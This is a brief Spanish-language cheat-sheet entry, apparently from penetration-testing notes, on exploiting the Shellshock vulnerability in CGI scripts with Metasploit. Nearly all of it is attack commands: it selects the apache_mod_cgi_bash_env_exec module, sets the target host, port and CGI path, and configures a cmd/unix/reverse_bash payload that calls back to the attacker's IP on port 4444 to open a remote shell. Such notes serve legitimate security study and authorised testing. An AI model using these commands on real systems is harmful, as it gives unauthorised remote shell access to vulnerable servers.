## Exploit Shellshock

Explota servicios vulnerables a Shellshock.

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
	set RHOSTS IP
	set RPORT 80
	set TARGETURI /RUTA.cgi
	set PAYLOAD cmd/unix/reverse_bash
	set LHOST TU_IP
	set LPORT 4444


### TARGETURI
Ruta del CGI vulnerable.